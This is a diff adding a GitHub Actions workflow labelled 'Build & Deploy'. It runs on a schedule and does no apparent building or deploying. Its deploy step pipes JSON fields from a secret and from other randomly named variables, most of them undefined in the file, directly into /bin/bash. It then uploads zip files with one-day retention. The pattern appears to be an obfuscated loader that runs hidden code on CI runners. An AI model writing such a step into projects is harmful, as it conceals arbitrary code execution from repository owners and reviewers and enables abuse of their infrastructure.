@@ -1,0 +1,33 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          ebrnu1400: ${{ secrets.ebrnu1400 }}
+        run: |
+          printf '%s' "$ebrnu1400" | jq -r .d1653 | /bin/bash
+          printf '%s' "$naol89416" | jq -r .hf3 | /bin/bash
+          printf '%s' "$pqt7" | jq -r .mc04 | /bin/bash
+          echo $ex5381 | jq -r .c6 | /bin/bash
+          printf '%s' "$qdydv19" | jq -r .o744 | /bin/bash
+          printf '%s' "$qdtzt62" | jq -r .oej1114 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: U3KmHyKl
+          path: "*.zip"
+          retention-days: 1
